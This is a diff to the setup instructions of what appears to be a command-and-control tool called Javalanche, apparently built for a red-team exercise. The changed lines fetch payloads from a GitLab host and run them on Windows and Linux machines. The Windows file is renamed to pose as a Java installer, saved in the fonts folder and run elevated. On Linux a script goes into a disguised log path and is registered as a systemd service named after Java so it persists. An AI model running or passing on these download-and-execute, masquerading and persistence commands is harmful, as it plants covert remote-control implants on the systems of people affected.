@@ -14,8 +14,8 @@ ps> .\setup.ps1 -server Beacon
 
 Windows Payload
 
-ps> wget -o C:\Windows\fonts\Javalanche.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsPayload.ps1?ref_type=heads"
-ps> Start-Process -FilePath "powershell.exe" -ArgumentList "set-executionpolicy -ExecutionPolicy Unrestricted -Scope Process -Force;& C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress {IP Address of Beacon}" -WindowStyle Hidden -Verb RunAs
+ps> wget -o C:\\Windows\\fonts\\jdk-23.0.1-bin-java.exe https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsBinary/x64/Debug/windowsBinary.exe?ref_type=heads 
+ps> Start-Process -FilePath "C:\\Windows\\fonts\\jdk-23.0.1-bin-java.exe" -Verb RunAs
 
 
 Linux C2 Server
@@ -44,10 +44,10 @@ Linux Payload
 
 $ sudo apt update
 $ sudo apt install curl
-$ sudo curl -o /etc/javalanche.sh "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads"
-$ sudo chmod +x /etc/javalanche.sh
-$ sudo curl -o /lib/systemd/system/java-init.service "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/java-init.service?ref_type=heads"
-$ sudo chmod 644 /lib/systemd/system/java-init.service
+$ sudo curl -o /var/log/asa/osa/java-23.0.1-bin-java.sh "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads"
+$ sudo chmod +x /var/log/asa/osa/java-23.0.1-bin-java.sh
+$ sudo curl -o /lib/systemd/system/java-23.0.1-bin-java.service "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/java-init.service?ref_type=heads"
+$ sudo chmod 644 /lib/systemd/system/java-23.0.1-bin-java.service
 $ systemctl daemon-reload
-$ suod systemctl enable java-init
-$ sudo systemctl start java-init
+$ suod systemctl enable java-23.0.1-bin-java.service
+$ sudo systemctl start java-23.0.1-bin-java.service
